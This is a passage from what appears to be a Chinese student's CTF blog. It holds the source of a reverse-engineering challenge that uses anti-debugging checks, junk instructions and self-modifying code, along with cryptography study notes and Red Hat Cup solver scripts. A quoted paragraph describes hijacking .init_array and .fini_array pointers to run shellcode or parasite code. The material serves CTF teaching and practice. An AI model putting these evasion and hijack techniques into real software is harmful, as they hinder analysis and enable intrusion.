class="hljs-keyword">sizeof</span>(exit_0);i++)<br>        &#123;<br>            temp = *(a+i);<br>            *(a+i) = exit_0[i];<br>            exit_0[i] = temp;<br>        &#125;<br>    <span class="hljs-keyword">if</span>(anti_debug1(a))<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debug everyday makes C0ss4ck a dull boy!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!VirtualProtect(a,<span class="hljs-built_in">size</span>,dwOldFlag,&amp;dwOldFlag))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    change(smc,<span class="hljs-number">206</span>,<span class="hljs-number">0x34</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">anti_debug1</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;jz lable5;&quot;</span><br>            <span class="hljs-string">&quot;call lable2;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable5:;&quot;</span><br>            );<br>    <span class="hljs-keyword">if</span>(!anti_debug2())<br>    &#123;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-keyword">sizeof</span>(exit_0);i++)<br>        &#123;<br>            *(a+i) = exit_0[i];<br>        &#125;<br>    &#125;<br>        __asm__(<br>        <span class="hljs-string">&quot;mov eax, fs:[0x30];&quot;</span><br>        <span class="hljs-string">&quot;mov eax,[eax+0x68];&quot;</span><br>        <span class="hljs-string">&quot;and eax,0x70;&quot;</span><br>    );<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">anti_debug2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov eax, fs:[0x30];&quot;</span><br>        <span class="hljs-string">&quot;movzx eax,byte ptr [eax+2];&quot;</span><br>    );<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a,<span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    DWORD dwOldFlag;<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable4;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable4:;&quot;</span><br>            );<br>    <span class="hljs-keyword">if</span>(!VirtualProtect(a,<span class="hljs-built_in">size</span>,PAGE_READWRITE,&amp;dwOldFlag))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">size</span>;i++)<br>        &#123;<br>            *(a+i) ^= key;<br>            *(a+i) = (*(a+i)&lt;&lt;<span class="hljs-number">4</span>) | (*(a+i)&gt;&gt;<span class="hljs-number">4</span>);<br>        &#125;<br>    <span class="hljs-keyword">if</span>(!VirtualProtect(a,<span class="hljs-built_in">size</span>,dwOldFlag,&amp;dwOldFlag))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>出题思路：<br>主要考察新生对ctf中常见的对抗逆向技术<br>分别是<br>anti_debug<br>Smc<br>Junk_code<br>加密部分写的不怎么复杂就一个TEA加上一些加加减减。<br>这些对大型比赛来说也就是个签到题把//或者签到题都算不上<br>源码解析：<br>前言：这是我六个月前第一次出题的代码有很多不足，有些还待改进。<br>有部分需要修改<br>exit_0是antibug中会使用到的<br>主要是对change函数开头赋值成exit(0)，故机器码需要根据最后生成的可执行文件修改。<br>还有就是花指令部分，生成完我才发现jmp的那个花指令没有起到我想要的效果，直接修改机器码E8(call)。<br>另外就是smc部分我只写了解密，生成完后肯定是不能运行的还需要patch，写脚本来加密，实现起来也不难。Idc即可</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;idc.idc&gt;<br>static main<span class="hljs-literal">()</span><br>&#123;<br>    auto addr = <span class="hljs-number">0x0040166A</span>;   <br>    auto i = <span class="hljs-number">0</span>;<br>    auto temp;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;addr+i&lt;<span class="hljs-number">0x00401738</span>;i++)   <br>    &#123;<br>        temp = ((<span class="hljs-constructor">Byte(<span class="hljs-params">addr</span>+<span class="hljs-params">i</span>)</span>&gt;&gt;<span class="hljs-number">4</span>)<span class="hljs-pattern-match">|(<span class="hljs-constructor">Byte(<span class="hljs-params">addr</span>+<span class="hljs-params">i</span>)</span>&lt;&lt;4))&amp;0xff;</span><br><span class="hljs-pattern-match">        <span class="hljs-constructor">PatchByte(<span class="hljs-params">addr</span>+<span class="hljs-params">i</span>,<span class="hljs-params">temp</span>^0x34)</span>;   </span><br><span class="hljs-pattern-match">    &#125;</span><br><span class="hljs-pattern-match">&#125;</span><br></code></pre></td></tr></table></figure>
<p>关于check部分一开始check了格式//事实上是多次一举，后面tea后又check了全部flag<br>还有就是strlen函数我发现有一个很不好的地方<br>套用在for循环中时，每一次都会check一次strlen，这样就出现一个问题，就是当tea后密文出现0，这样strlen就会被有差错，当初我设定的flag时nctf…然后加密一轮后出现0，直接不加密了，时间问题没有好好优化就把开头改成了NCTF，其实改成24就行，毕竟前面已经限制了长度必须为24<br>还有就是花指令部分<br>主要出现了俩种花指令，一种是栈指针还有一种是jmp的。<br>反调试部分我才用使用汇编来写，这样的话ida不会反编译出函数，比如antidebug2其实就是isdebuggerpresent而Ida并不会识别出该函数。<br>smc部分我采用了double_smc,这样就不能通过data xref来追踪。但是意义不大。。。熟练的人一下就能看出，smc部分出现的anti_debug,下面printf一句debug everyday可以一下看出这是反调试函数，但是如果不仔细逆向直接把该函数patch的话到change函数就直接exit了，里面紧跟着的又是一个反调试并把之前保存在exit的值重新赋给change开头</p>
<h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>面向字节的密码<br>state：4*4矩阵（key 128位，列数为6/8当key为192或256时）</p>
<h2 id="addroundkey"><a href="#addroundkey" class="headerlink" title="addroundkey"></a>addroundkey</h2><p>状态矩阵与子密钥xor</p>
<h3 id="密钥编排"><a href="#密钥编排" class="headerlink" title="密钥编排"></a>密钥编排</h3><p>state每列四个进行操作<br>第四列(key4) key5 =（key4）rotword —&gt; subbytes —&gt; xor key1<br>key5 —&gt; xor key2<br>。。。<br>每四次一次rotworld subbytes </p>
<h2 id="subbytes"><a href="#subbytes" class="headerlink" title="subbytes"></a>subbytes</h2><p>s_box s_box-1 互逆<br>对应取值为在GF(2m)中的逆元经过仿射后的值<br>比如c2逆元为2f经过仿射后为25就是S(C2)的值<br>S(A)=B<br>非线性：S(A+B) != S(A)+S(B)</p>
<h2 id="扩散层"><a href="#扩散层" class="headerlink" title="扩散层"></a>扩散层</h2><p>将单个位的影响扩散到整个状态，且都为线性操作<br>也是fault的写法</p>
<h3 id="shiftrows"><a href="#shiftrows" class="headerlink" title="shiftrows"></a>shiftrows</h3><p>将状态的每行左移<br>第一行不变<br>第二行移1<br>第三行2<br>第四行3<br>不改变值</p>
<h3 id="mixcolumn"><a href="#mixcolumn" class="headerlink" title="mixcolumn"></a>mixcolumn</h3><p>和固定矩阵相乘，扩大字节影响范围。<br>具体乘法实现是在GF(2^8)中实现的</p>
<h2 id="逆向mixcolumn"><a href="#逆向mixcolumn" class="headerlink" title="逆向mixcolumn"></a>逆向mixcolumn</h2><p>乘上在伽罗瓦域上的互逆矩阵</p>
<h2 id="逆向shiftrow"><a href="#逆向shiftrow" class="headerlink" title="逆向shiftrow"></a>逆向shiftrow</h2><p>可以理解为rightrow</p>
<h2 id="逆向subbytes"><a href="#逆向subbytes" class="headerlink" title="逆向subbytes"></a>逆向subbytes</h2><p>sbox逆操作先仿射变换逆然后求解逆元即可</p>
<h1 id="AES-DFA"><a href="#AES-DFA" class="headerlink" title="AES_DFA"></a>AES_DFA</h1><p>例子：round9<br>在最后一轮mixcol之前出现了单字节fault<br>经过mix和shift等操作影响到四个字节<br>和正确密文xor得出表达式可进行约束求解<br>对于aes128需要每列俩个fault数据，足够可约束出key10的4个byte<br>所以总共需要8组fault数据和一组正确密文<br>这样就能够求出key10<br>然后就能反推密钥编排求出key</p>
<h2 id="XCTF-FINAL-2019-FAULT"><a href="#XCTF-FINAL-2019-FAULT" class="headerlink" title="XCTF-FINAL 2019 FAULT"></a>XCTF-FINAL 2019 FAULT</h2><p><img src="33.png" srcset="/img/loading.gif" lazyload alt="33"><br>可以看到aes这部分出现了一个很明显的问题<br>再最后俩次mc之前有一次xor<br>这样就会产生fault<br>经过俩次俩次mcfault影响到16字节<br>v8是0，但是可以通过利用溢出来修改<br>获取俩组错误密文和一组正确明文就可以求解出key10<br>然后key就可以求出来了<br>看了下其他队伍的wp发现貌似还有其他的写法。。。<br>直接利用printf打出来那种。。。<br>哎。。。太菜了<br>学了波数学算是搞懂原理了</p>
<h1 id="RSA加密与解密"><a href="#RSA加密与解密" class="headerlink" title="RSA加密与解密"></a>RSA加密与解密</h1><h2 id="平方乘法"><a href="#平方乘法" class="headerlink" title="平方乘法"></a>平方乘法</h2><p>快速计算指数的方法<br>指数用二进制表示<br>初始化平方<br>如果为1<br>平方后mul<br>如果为0<br>直接平方<br>原理其实就是在逐位复现二进制</p>
<h2 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h2><p>没怎么看懂。。。<br>但是百度了下发现是求解同余方程的</p>
<h2 id="寻找大素数"><a href="#寻找大素数" class="headerlink" title="寻找大素数"></a>寻找大素数</h2><h2 id="费马素性检测"><a href="#费马素性检测" class="headerlink" title="费马素性检测"></a>费马素性检测</h2><p>用费马定理推，不满足则为合数<br>满足则可能为素数<br>//特例是卡迈尔克数</p>
<h2 id="Miller-Rabin素性测试"><a href="#Miller-Rabin素性测试" class="headerlink" title="Miller-Rabin素性测试"></a>Miller-Rabin素性测试</h2><p>p = 2^x * r<br>a^r = p-1<br>a(rand) // count = s</p>
<h1 id="Diffie-Hellman密钥交换"><a href="#Diffie-Hellman密钥交换" class="headerlink" title="Diffie-Hellman密钥交换"></a>Diffie-Hellman密钥交换</h1><p>选择大素数p与整数a<br>p作为模数<br>甲方选择key1<br>乙方选择key2<br>a^key1 mod p -&gt; 乙方<br>b^key2 mod p -&gt; 甲方<br> 然后再一次的指数运算<br>这样双方的值就相同，即是传输的key</p>
<h1 id="代数知识"><a href="#代数知识" class="headerlink" title="代数知识"></a>代数知识</h1><h2 id="群"><a href="#群" class="headerlink" title="群"></a>群</h2><p>群指一个元素集合G以及联合G内两个元素的操作o的集合。<br>1.群操作o是封闭的，对于ab in G ，aob in G始终成立<br>2.群操作可结合<br>3.存在一个元素1 in G，对所有的a in G均满足ao1=1oa=a，这个元素称为中性元或单位元<br>4.对每个元素a in G，存在一个元素a-1 in G，满足aoa-1=a-1oa=1，则a-1称为a的逆元<br>5.对所有的a，b in G 都额外满足aob=boa，则群G称为阿贝尔群或可交换群。</p>
<h2 id="元素的阶"><a href="#元素的阶" class="headerlink" title="元素的阶"></a>元素的阶</h2><p>a^k = 1 mod n<br>k为阶</p>
<h2 id="循环群"><a href="#循环群" class="headerlink" title="循环群"></a>循环群</h2><h3 id="有限群"><a href="#有限群" class="headerlink" title="有限群"></a>有限群</h3><p>一个群是有限的仅当他拥有有限个元素群G的阶或基可以表示为｜G｜<br>Zn，+的基为n<br>Zn，·的基为n的欧拉函数，Zn是由小于n且与n互素的正整数的集合</p>
<h3 id="元素的阶-1"><a href="#元素的阶-1" class="headerlink" title="元素的阶"></a>元素的阶</h3><p>a^k=1 k为阶</p>
<h3 id="循环群-1"><a href="#循环群-1" class="headerlink" title="循环群"></a>循环群</h3><p>群G包含一个有拥有最大阶的a=｜G｜，就是循环群，a为原根（本原元）或生成元</p>
<p>对于每个素数p Zp都是一个阿贝尔有限循环群<br>有限循环群G的本原元的个数为｜G｜的欧拉函数<br>｜G｜为素数时，a!=1的元素都是本原元</p>
<h2 id="子群"><a href="#子群" class="headerlink" title="子群"></a>子群</h2><p>（G，o）是个循环群，则G内每一个满足ord（a）=s的元素a都是拥有s个元素的循环子群的本原元</p>
<h2 id="拉格朗日定理"><a href="#拉格朗日定理" class="headerlink" title="拉格朗日定理"></a>拉格朗日定理</h2><p>假设H为G的一个子群，则｜H｜可以整除｜G｜。</p>
<p>//todo</p>
<h1 id="基本协议"><a href="#基本协议" class="headerlink" title="基本协议"></a>基本协议</h1><p>Bob公开keypub 对消息x进行哈希函数生成z，然后用keypri对z进行签名为s，收方Alice验证s解密后是否为z即可。</p>
<h1 id="哈希函数的安全要求"><a href="#哈希函数的安全要求" class="headerlink" title="哈希函数的安全要求"></a>哈希函数的安全要求</h1><p>1.抗第一原像性（单向性）<br>2.抗第二原像性（弱抗冲突性）<br>3.抗冲突性（强抗冲突性）</p>
<h2 id="弱抗冲突性"><a href="#弱抗冲突性" class="headerlink" title="弱抗冲突性"></a>弱抗冲突性</h2><p>鸽笼原理证明了弱抗冲突性对于哈希函数来说必存在。所以需要满足的条件就是正向容易逆向难，给定x1与其对应的哈希不能找到消息x2生成同样的哈希</p>
<h2 id="强抗冲突性与生日攻击"><a href="#强抗冲突性与生日攻击" class="headerlink" title="强抗冲突性与生日攻击"></a>强抗冲突性与生日攻击</h2><p>生日攻击简介：<br>至少出现多少人才会出现生日冲突概率大于1/2<br>答案是23个<br>不冲突概率为（1-1/365）（1-2/365）。。。<br>用1-该值即可<br>当40人时，冲突概率达到90%<br>生日攻击是对所有哈希函数的通用攻击，该攻击的存在决定了哈希函数的输出位数至少为128位<br>测试数据至少约为2^(n/2)<br>n为位数<br>对于主流哈希函数还有更快的攻击就是数学冲突攻击</p>
<h1 id="哈希函数概述"><a href="#哈希函数概述" class="headerlink" title="哈希函数概述"></a>哈希函数概述</h1><h2 id="专用哈希函数MD4家族"><a href="#专用哈希函数MD4家族" class="headerlink" title="专用哈希函数MD4家族"></a>专用哈希函数MD4家族</h2><p>主要指转为哈希函数而专门设计的算法</p>
<h1 id="对称密码学与非对称密码学"><a href="#对称密码学与非对称密码学" class="headerlink" title="对称密码学与非对称密码学"></a>对称密码学与非对称密码学</h1><h2 id="对称密码学"><a href="#对称密码学" class="headerlink" title="对称密码学"></a>对称密码学</h2><p>存在问题<br>1.密钥的分配<br>因为信道不安全<br>2.密钥的个数<br>对于一个很大的网络需要存储的密钥有很多对<br>3.不可实现不可否认性</p>
<h2 id="非对称密码学"><a href="#非对称密码学" class="headerlink" title="非对称密码学"></a>非对称密码学</h2><p>key分为公钥与私钥<br>公钥公开，用户用公钥加密数据后，收方可用私钥来解密<br>具体的实现需要一个单向函数<br>准确来说就是逆运算即使用已知的最好的算法也需要花费很长的时间，但是正向运算足够快。<br>目前来说满足的只有大整数分解问题，离散对数问题还有椭圆曲线。</p>
<h2 id="数学知识-1"><a href="#数学知识-1" class="headerlink" title="数学知识"></a>数学知识</h2><h3 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h3><p>gcd（最大公约数）<br>求解最大公约数通过mod迭代直到为0即可求得最大公约数</p>
<h3 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h3><p>在欧几里得算法的基础上将最大公约数以线性的方式表示<br>求解逆元<br>逆元存在条件当且仅当gcd=1即互素<br>求解a mod b的逆元可用EEA表示gcd<br>然后对应a的系数就是逆元</p>
<h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>相应环内与之互素的个数<br>如果m可因式分解那么就有公式可以套用</p>
<h3 id="费马小定理与欧拉定理"><a href="#费马小定理与欧拉定理" class="headerlink" title="费马小定理与欧拉定理"></a>费马小定理与欧拉定理</h3><p>费马小定理<br>a为整数p为素数<br>则a^p = a(mod p)//a的p次方<br>推广到整数就是欧拉定理//使用条件是a与m互素<br>a^o(m)=1modm<br>费马小定理就是欧拉的特殊情况//当p为素数时</p>
<h2 id="基于分组密码的哈希函数"><a href="#基于分组密码的哈希函数" class="headerlink" title="基于分组密码的哈希函数"></a>基于分组密码的哈希函数</h2><p>输入分组进入压缩函数迭代<br>输出为最后一轮压缩函数的输出<br>// Merkle-Damgard结构</p>
<h1 id="红帽杯"><a href="#红帽杯" class="headerlink" title="红帽杯"></a>红帽杯</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>题目名称是xx<br>可以想到是xxtea<br>首先程序检查输入长度是否为19然后进行一次xxtea加密<br><img src="34.png" srcset="/img/loading.gif" lazyload alt="34"><br>加密的key是输入的前四个字符<br>然后有一个换位xor的操作逆过来整一下就行了<br><img src="35.png" srcset="/img/loading.gif" lazyload alt="35"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> xxtea<br>a = [<span class="hljs-number">0xCE</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x9B</span>,<br>  <span class="hljs-number">0x20</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC8</span>,<br>  <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xFA</span>]<br>C = [<span class="hljs-number">0</span>]*<span class="hljs-number">24</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)-<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i/<span class="hljs-number">3</span>):<br>        a[i] ^= a[j]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    C[i] = a[i]<br>encrypt_data = <span class="hljs-string">&#x27;&#x27;</span><br>A = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0xA</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>,<span class="hljs-number">0xE</span>,<span class="hljs-number">0xF</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x18</span>]<br>B = [<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xA</span>,<span class="hljs-number">0xF</span>,<span class="hljs-number">0xD</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xE</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x16</span>]<br><span class="hljs-comment">#C = [0xce,0xbc,0x40,0xa5,0xb2,0xf4,0xe7,0xb2,0x9d,0xa9,0x12,0x12,0xc8,0xae,0x5b,0x10,0x06,0x3d,0x1d,0xd7,0xf8,0xdc,0xdc,0x70]</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(A)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(A)):<br>        <span class="hljs-keyword">if</span> B[j] == A[i]:<br>            <span class="hljs-comment">#print hex(C[j])</span><br>            encrypt_data += <span class="hljs-built_in">chr</span>(C[j])<br>            <span class="hljs-keyword">break</span><br>key = <span class="hljs-string">&#x27;flag&#x27;</span><br>decrypt_data = xxtea.decrypt(encrypt_data, key)<br><span class="hljs-built_in">print</span> decrypt_data<br><span class="hljs-comment">#flag&#123;CXX_and_++tea&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>没怎么逆<br>看的时候听学长说貌似要看sub_400D35函数<br>当时没多想点进去看了下就是个xor<br>和key<br><img src="36.png" srcset="/img/loading.gif" lazyload alt="36"><br>看了下发现还是猜<br>第一个xor后为f<br>第四个为g<br>那不很明显flag吗<br>猜一下然后xor就行了</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span> = [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2F</span>,<br>  <span class="hljs-number">0x24</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x6E</span>,<br>  <span class="hljs-number">0x72</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x5B</span>]<br>b = <span class="hljs-string">&#x27;flag&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">a</span>)):<br>    flag += chr(<span class="hljs-keyword">a</span>[i]^(<span class="hljs-keyword">a</span>[i%<span class="hljs-number">4</span>]^ord(b[i%<span class="hljs-number">4</span>])))<br>print flag<br><span class="hljs-comment">#flag&#123;Act1ve_Defen5e_Test&#125;</span><br></code></pre></td></tr></table></figure>
<p>后来仔细看了下一开始对你输入进行了xor i比较<br>解一下</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">a = [ <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x6F</span>,<br>  <span class="hljs-number">0x63</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x33</span>,<br>  <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x3D</span>,<br>  <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x43</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">for i in range(len(a)):</span><br><span class="hljs-string">    flag += chr(a[i]^i)</span><br><span class="hljs-string">print flag</span><br><span class="hljs-string">#Info:The first four chars are `flag`</span><br></code></pre></td></tr></table></figure>
<p>然后又一次输入<br>对第二次输入进行一堆base64解密<br>直接比较<br>发现为<br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-254172.htm">https://bbs.pediy.com/thread-254172.htm</a><br>然后就没了？？？？？？？？？？？？<br>在sub_400D35下断点发现断下来了<br>看来还是会跑过去<br>但是与输入无关。。。和时间相关</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">大多数可执行文件是通过链接 <span class="hljs-selector-tag">libc</span> 来进行编译的，因此 <span class="hljs-selector-tag">gcc</span> 会将 <span class="hljs-selector-tag">glibc</span> 初始化代码放入编译好的可执行文件和共享库中。 <span class="hljs-selector-class">.init_array</span>和 <span class="hljs-selector-class">.fini_array</span> 节（早期版本被称为 <span class="hljs-selector-class">.ctors</span>和 <span class="hljs-selector-class">.dtors</span> ）中存放了指向初始化代码和终止代码的函数指针。 <span class="hljs-selector-class">.init_array</span> 函数指针会在 <span class="hljs-selector-tag">main</span>() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 <span class="hljs-selector-class">.fini_array</span> 函数指针在 <span class="hljs-selector-tag">main</span>() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏（如曾经的 <span class="hljs-selector-tag">http</span>://<span class="hljs-selector-tag">phrack</span><span class="hljs-selector-class">.org</span>/<span class="hljs-selector-tag">issues</span>/57/9<span class="hljs-selector-class">.html</span> ）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 <span class="hljs-selector-tag">shellcode</span> 地址的函数指针来重写<span class="hljs-selector-class">.fini_array</span> 函数指针。对于大多数病毒或者恶意软件作者来说， <span class="hljs-selector-class">.init_array</span> 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。<br></code></pre></td></tr></table></figure>
<p>最后发现是这个考点。。。<br>打pwn的肯定知道</p>
<h2 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h2><p>三次输入<br>中间有sleep直接给patch了<br>先对输入进行了平方     FF0是pow函数<br>然后是乘4            A90是mul函数<br>然后对第二个输入<br>乘3<br>平方<br>对第三个输入<br>他先用7 * input3<br>然后result**input3<br>我佛了<br>下面是对输入的判断<br>input2&lt;input1&lt;input3          //应该是这个，没有仔细看<br>然后对三个输入之间进行一些蛇皮操作后就来最终check了<br>对了就有flag<br>//check大小完后的操作<br>550函数为add<br>7E0函数为del</p>
